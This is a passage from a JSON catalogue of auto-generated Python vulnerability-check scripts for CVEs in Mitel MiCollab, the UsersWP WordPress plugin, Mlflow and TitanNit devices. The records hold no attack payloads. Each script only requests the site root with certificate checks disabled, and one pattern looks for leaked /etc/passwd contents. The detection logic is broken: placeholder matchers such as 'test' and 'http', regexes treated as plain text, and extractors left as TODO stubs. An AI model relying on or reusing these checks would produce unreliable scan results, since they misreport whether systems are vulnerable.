\"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Mitel MiCollab - Arbitary File Read\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_55550(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2024-55550"
        ],
        "tags": [
          "cve",
          "cve2024",
          "mitel",
          "lfi",
          "cmg-suite",
          "auth-bypass",
          "kev",
          "vkev",
          "vuln"
        ],
        "cvss_score": 4.4
      },
      {
        "id": "fn_nuclei_c_v_e_2024_6265",
        "name": "UsersWP <= 1.2.10 - Unauthenticated SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "UsersWP – Front-end login form, User Registration, User Profile & Members Directory plugin for WordPress contains a time-based SQL Injection caused by insufficient escaping of the 'uwp_sort_by' parameter in all versions up to 1.2.10, letting unauthenticated attackers execute arbitrary SQL queries, exploit requires attacker to control the 'uwp_sort_by' parameter.",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=6; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-6265\nName: UsersWP <= 1.2.10 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: UsersWP – Front-end login form, User Registration, User Profile & Members Directory plugin for WordPress contains a time-based SQL Injection caused by insufficient escaping of the 'uwp_sort_by' parameter in all versions up to 1.2.10, letting unauthenticated attackers execute arbitrary SQL queries, exploit requires attacker to control the 'uwp_sort_by' parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_6265:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-6265\"\n    SEVERITY = \"critical\"\n    NAME = \"UsersWP <= 1.2.10 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UsersWP <= 1.2.10 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_6265(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-6265\nName: UsersWP <= 1.2.10 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: UsersWP – Front-end login form, User Registration, User Profile & Members Directory plugin for WordPress contains a time-based SQL Injection caused by insufficient escaping of the 'uwp_sort_by' parameter in all versions up to 1.2.10, letting unauthenticated attackers execute arbitrary SQL queries, exploit requires attacker to control the 'uwp_sort_by' parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_6265:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-6265\"\n    SEVERITY = \"critical\"\n    NAME = \"UsersWP <= 1.2.10 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UsersWP <= 1.2.10 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_6265(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "wordpress",
          "wp",
          "wp-plugin",
          "userswp",
          "sqli",
          "time-based",
          "unauth",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_8859",
        "name": "Mlflow < 2.17.0 - Local File Inclusion",
        "language": "Python",
        "famille": "CVE",
        "description": "Mlflow before 2.17.0 is susceptible to local file inclusion due to path traversal in GitHub repository mlflow/mlflow. An attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.",
        "severity": "critical",
        "detection": "[AND] regex ['root:.*:0:0:'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-8859\nName: Mlflow < 2.17.0 - Local File Inclusion\nSeverity: critical\nDescription: Mlflow before 2.17.0 is susceptible to local file inclusion due to path traversal in GitHub repository mlflow/mlflow. An attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_8859:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-8859\"\n    SEVERITY = \"critical\"\n    NAME = \"Mlflow < 2.17.0 - Local File Inclusion\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Mlflow < 2.17.0 - Local File Inclusion\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_8859(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-8859\nName: Mlflow < 2.17.0 - Local File Inclusion\nSeverity: critical\nDescription: Mlflow before 2.17.0 is susceptible to local file inclusion due to path traversal in GitHub repository mlflow/mlflow. An attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_8859:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-8859\"\n    SEVERITY = \"critical\"\n    NAME = \"Mlflow < 2.17.0 - Local File Inclusion\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Mlflow < 2.17.0 - Local File Inclusion\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_8859(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve2024",
          "cve",
          "mlflow",
          "oss",
          "lfi",
          "huntr",
          "intrusive",
          "lfprojects",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_9166",
        "name": "TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "The device contains a command injection caused by the 'getcommand' query in the application, letting unauthorized attackers execute system commands with root privileges, exploit requires attacker to send crafted requests.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'http' | mot(s) 'titan.css'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-9166\nName: TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution\nSeverity: critical\nDescription: The device contains a command injection caused by the 'getcommand' query in the application, letting unauthorized attackers execute system commands with root privileges, exploit requires attacker to send crafted requests.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_9166:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-9166\"\n    SEVERITY = \"critical\"\n    NAME = \"TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'http' | mot(s) 'titan.css'\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'titan.css']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        